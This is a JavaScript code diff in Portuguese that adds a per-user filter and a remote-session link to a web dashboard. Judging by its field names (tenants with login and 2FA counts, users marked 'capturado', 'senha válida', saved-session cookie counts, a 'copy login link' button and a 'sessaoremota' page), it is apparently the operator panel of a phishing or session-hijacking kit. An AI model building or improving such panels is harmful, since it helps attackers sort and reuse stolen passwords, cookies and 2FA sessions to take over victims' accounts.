@@ -17,6 +17,8 @@ const kpiUsuarios = document.getElementById("kpi-usuarios");
 const containerTabela = document.getElementById("container-tabela");
 const filtroBusca = document.getElementById("filtro-busca");
 const seletorTenant = document.getElementById("seletor-tenant");
+const seletorUsuario = document.getElementById("seletor-usuario");
+let usuarioFiltro = "";
 const btnCopiarLinkLogin = document.getElementById("btn-copiar-link-login");
 const linkSessaoRemotaTop = document.getElementById("link-sessao-remota-top");
 const tabConsolidado = document.getElementById("tab-consolidado");
@@ -228,10 +230,10 @@ async function carregarTenants() {
     const json = await res.json();
     if (json.success && Array.isArray(json.tenants)) {
       const valorAtual = seletorTenant.value || tenantAtivo;
-      let html = `<option value="">🏢 Todos os Tenants (Global)</option>`;
+      let html = `<option value="">Todos os Tenants (Global)</option>`;
       json.tenants.forEach(t => {
         const sel = t.tenant === valorAtual ? "selected" : "";
-        html += `<option value="${escapeHtml(t.tenant)}" ${sel}>🏷️ ${escapeHtml(t.tenant)} (${t.totalLogins} logins, ${t.total2FA} 2FA)</option>`;
+        html += `<option value="${escapeHtml(t.tenant)}" ${sel}>${escapeHtml(t.tenant)} (${t.totalLogins} logins, ${t.total2FA} 2FA)</option>`;
       });
       seletorTenant.innerHTML = html;
       if (valorAtual) seletorTenant.value = valorAtual;
@@ -239,6 +241,30 @@ async function carregarTenants() {
   } catch (err) {
     console.error("Erro ao carregar lista de tenants:", err);
   }
+}
+
+function carregarSeletorUsuarios() {
+  if (!seletorUsuario) return;
+  const consolidados = dadosAtuais.consolidados || [];
+  const valorAtual = seletorUsuario.value || usuarioFiltro;
+  let html = `<option value="">Todos os Usuários (${consolidados.length})</option>`;
+  consolidados.forEach(item => {
+    const u = item.usuario;
+    const sel = u === valorAtual ? "selected" : "";
+    let badge = item.tem_sessao_salva ? `${item.total_cookies || 0} cookies` : (item.status_credencial === "valido" ? "senha válida" : (item.status || "capturado"));
+    html += `<option value="${escapeHtml(u)}" ${sel}>${escapeHtml(u)} [${escapeHtml(badge)}]</option>`;
+  });
+  seletorUsuario.innerHTML = html;
+  if (valorAtual) seletorUsuario.value = valorAtual;
+}
+
+function atualizarLinkSessaoRemota() {
+  if (!linkSessaoRemotaTop) return;
+  const params = new URLSearchParams();
+  if (usuarioFiltro) params.set("usuario", usuarioFiltro);
+  if (tenantAtivo) params.set("tenant", tenantAtivo);
+  const q = params.toString();
+  linkSessaoRemotaTop.href = `/sessaoremota.html${q ? `?${q}` : ''}`;
 }
 
 async function carregarDados() {
@@ -253,6 +279,8 @@ async function carregarDados() {
     if (json.success) {
       dadosAtuais = json;
       atualizarKpis();
+      carregarSeletorUsuarios();
+      atualizarLinkSessaoRemota();
       renderizarTabela();
     }
   } catch (err) {
@@ -294,6 +322,9 @@ function renderizarAuditoria() {
 
   const termo = termoBusca.toLowerCase().trim();
   let filtrados = dadosAuditoria || [];
+  if (usuarioFiltro) {
+    filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
+  }
   if (termo) {
     filtrados = filtrados.filter(item => {
       const u = (item.usuario || "").toLowerCase();
@@ -438,6 +469,9 @@ function renderizarTabela() {
 
   if (abaAtiva === "consolidado") {
     let filtrados = dadosAtuais.consolidados || [];
+    if (usuarioFiltro) {
+      filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
+    }
     if (termo) {
       filtrados = filtrados.filter(item => {
         const u = (item.usuario || "").toLowerCase();
@@ -615,6 +649,9 @@ function renderizarTabela() {
   } else {
     // Modo Feed Cronológico
     let filtrados = dadosAtuais.feed || [];
+    if (usuarioFiltro) {
+      filtrados = filtrados.filter(item => (item.usuario || "").toLowerCase() === usuarioFiltro.toLowerCase());
+    }
     if (termo) {
       filtrados = filtrados.filter(item => {
         const u = (item.usuario || "").toLowerCase();
@@ -855,6 +892,19 @@ if (seletorTenant) {
       carregarDados();
     }
     showToast(tenantAtivo ? `Filtrando por tenant: ${tenantAtivo}` : "Visualizando todos os tenants");
+  });
+}
+
+if (seletorUsuario) {
+  seletorUsuario.addEventListener("change", () => {
+    usuarioFiltro = seletorUsuario.value;
+    atualizarLinkSessaoRemota();
+    if (abaAtiva === "auditoria") {
+      renderizarAuditoria();
+    } else {
+      renderizarTabela();
+    }
+    showToast(usuarioFiltro ? `Filtrando por usuário: ${usuarioFiltro}` : "Visualizando todos os usuários");
   });
 }
 
